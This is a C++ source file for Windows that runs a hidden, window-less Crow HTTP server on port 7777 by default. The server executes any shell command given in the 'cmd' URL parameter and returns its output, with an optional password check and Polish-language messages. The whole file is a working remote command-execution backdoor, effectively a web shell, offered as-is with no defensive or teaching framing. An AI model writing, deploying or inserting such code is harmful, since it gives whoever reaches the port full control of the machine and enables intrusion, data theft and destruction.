#include "crow.h"
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

#include "FileFetcher.h"

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
    WCHAR filepath[MAX_PATH];
	GetModuleFileNameW(NULL, filepath, MAX_PATH);
	const wchar_t* path = filepath;

    FileFetcher fetcher;
    fetcher.SetExecutableDirectory(path);
    fetcher.FetchPassAndPort();

    std::string pass = fetcher.GetPass();
    uint16_t parsedPort;
    try {
        if(fetcher.GetPort().length() > 0)
            parsedPort = std::stoi(fetcher.GetPort());
        else 
            parsedPort = 7777;
    }
    catch (...) { 
        parsedPort = 7777; 
    }
    

    crow::SimpleApp app;

    CROW_ROUTE(app, "/")
        .methods("GET"_method)([pass](const crow::request& req, crow::response& res) {
        const char* cmd_param = req.url_params.get("cmd");
        const char* pass_param = req.url_params.get("pass");
        if (cmd_param && *cmd_param){
            if (pass.length() > 0)
            {
                if (!pass_param || !*pass_param || pass_param!=pass) {
                    res.write("Wrong password");
                    res.end();
                    return;
                }
            }
            
            res.write("Wynik komendy: \n");
            res.write(exec(cmd_param));
        }
        else {
            res.write("Brak komendy w zapytaniu. Przykład: http://127.0.0.1:7777/?cmd=mkdir test");
        }
        res.end();
            });

    app.port(parsedPort).multithreaded().run();
    return 0;
}
